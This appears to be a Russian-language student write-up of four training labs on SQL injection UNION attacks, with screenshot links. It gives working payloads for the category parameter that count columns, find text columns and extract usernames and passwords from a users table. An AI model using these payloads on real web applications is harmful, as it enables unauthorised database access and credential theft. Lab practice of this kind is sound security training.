 h1 Lab: SQL injection UNION attack, determining the number of columns returned by the query 
 
 Изменяем category, чтобы добавить дополнительный столбец, содержащий нулевое значение:'+UNION+SELECT+NULL,NULL--
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_1_1.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_1_2.PNG)
 
 Lab: SQL injection UNION attack, finding a column containing text
 
 Меняем значение category '+UNION+SELECT+NULL-- , Происходит ошибка:
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_2_1.PNG)
Меняем значение category на '+UNION+SELECT+NULL,NULL,NULL-- 
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_2_2.PNG)
Работает)
![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_2_3.PNG)
 
 Lab: SQL injection UNION attack, retrieving data from other tables
 
 Убеждаемся в том, что запрос возвращает два столбца, оба из которых содержат текст, используя полезную нагрузку , как в следующем в параметре категории: '+UNION+SELECT+'abc','def'-- :
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_1.PNG)
 Используйте следующую полезную нагрузку для извлечения содержимого usersтаблицы:'+UNION+SELECT+username,+password+FROM+users-- :
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_2.PNG)
 Проверяем
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_3.PNG)
 Работает)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_4.PNG)
 
 Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
 Убеждаемся, что запрос возвращает два столбца, только один из которых содержит текст, используя полезную нагрузку, подобную следующей в categoryпараметре:'+UNION+SELECT+NULL,'abc'-- :
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_1.PNG)
 Используйте следующую полезную нагрузку для извлечения содержимого usersтаблицы:'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_2.PNG)
 Проверяем
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_3.PNG)
 Работает)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_4.PNG)
 
